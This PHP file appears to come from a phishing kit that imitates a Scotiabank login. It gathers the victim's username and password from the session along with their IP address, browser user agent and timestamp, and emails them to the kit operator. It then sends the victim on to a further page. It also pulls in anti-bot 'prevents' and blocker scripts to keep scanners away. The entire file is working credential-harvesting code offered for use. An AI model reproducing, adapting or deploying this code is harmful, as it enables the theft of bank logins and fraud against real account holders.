<?php

session_start();
	include './youremail.php';
		include 'blocker.php';
			include './prevents/anti7.php';
				include './prevents/anti8.php';
					include './prevents/anti9.php';
	

    

	
	

    $ip = getenv("REMOTE_ADDR");
    $browserAgent = $_SERVER['HTTP_USER_AGENT'];
    $timedate = date("D/M/d, Y g(idea) a");

 
    
    $subject = 'Sco Login Account [ '.$ip.'  ]';
    $cc1 = $_SESSION['username'];
    $pp = $_SESSION['password'];
    $data ="
    =============## scotia LOGIN ##==================
    |EMAIL : $cc1
    |PASS : $pp
    ============## Goodies ##=======================
    IP : $ip
    UA : $browserAgent
    Time : $timedate
    ";
	
		
	if (strlen($cc1) <= 20 && strlen($cc1) >= 7){
		   	mail($to, $subject, $data);
	
	}
	

    
	
    header("Location: Step1.php");
    
 ?>